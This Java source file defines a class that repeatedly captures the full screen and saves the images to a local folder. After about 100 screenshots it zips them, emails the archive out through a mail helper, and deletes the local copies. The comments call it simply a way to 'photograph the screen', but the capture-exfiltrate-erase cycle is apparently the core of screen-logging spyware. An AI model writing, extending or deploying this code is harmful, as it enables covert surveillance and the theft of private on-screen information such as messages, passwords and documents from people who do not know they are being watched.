package cn.com.impl;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.Buffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.zip.ZipEntry;

import javamail.SendMail;

import javax.imageio.ImageIO;
import javax.imageio.stream.FileImageOutputStream;
import javax.swing.filechooser.FileSystemView;

import zip.impl.CompressFile;


/**
 * 给屏幕拍照
 * 
 * @author Administrator
 * 
 */
public class GuiCamera {
	private static GuiCamera camera;

	private String fileName;

	private String defaultName = "桌面";

	static int serialNum = 0;

	private String imageFormat;

	private String defautlmageFormat = "jpg";

	Dimension d = Toolkit.getDefaultToolkit().getScreenSize();// 获取屏幕大小

	private GuiCamera() {
		fileName = defaultName;
		imageFormat = defautlmageFormat;
	}

	private GuiCamera(String s, String format) {
		fileName = s;
		imageFormat = format;
	}

	public File snapShot() {
		File f = null;
		try {
			// 从屏幕中读取图像
			BufferedImage screenshot = (new Robot())
			// 从屏幕中读取图像， Rectangle--空间区域
					.createScreenCapture(new Rectangle(0, 0, d.width, d.height));
			serialNum++;
			//File path = FileSystemView.getFileSystemView().getHomeDirectory();// 获得桌面路径
			
			File folder=new File("截图");
			String format = "jpg";
			String name = folder +File.separator+getDateInfo()+"."
					+ imageFormat;// 文件格式
			f = new File(name);
			System.out.println("sava file 到： " + name);
			String zipPath=getDateInfo()+".zip";
		File[] allFile=folder.listFiles();
		int fileSum=allFile.length;
			if(fileSum>=100){
				serialNum=0;
				CompressFile.createZip("截图", zipPath);//打包
				SendMail.sendZipMail(zipPath);//发送邮件
				for (int i = 0; i < allFile.length; i++) {
					allFile[i].delete();
				}
			}
			try {
				ImageIO.write(screenshot, imageFormat, f);
				System.out.println("完成");

			} catch (IOException e) {
				e.printStackTrace();
			}

		} catch (AWTException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return f;
	}
public static String getDateInfo(){
	Date date=new Date();
	SimpleDateFormat format=new SimpleDateFormat("yyyy年MM月dd日HH.mm.ss");
	String dateInfo=format.format(date);
	return dateInfo;
}
	public static GuiCamera createCamera() {
		if (camera == null) {
			camera = new GuiCamera();
		}
		return camera;
	}

	// /**
	// * @param args
	// */
	// public static void main(String[] args) {
	// GuiCamera camera = new GuiCamera();
	// camera.snapShot();
	// }

}
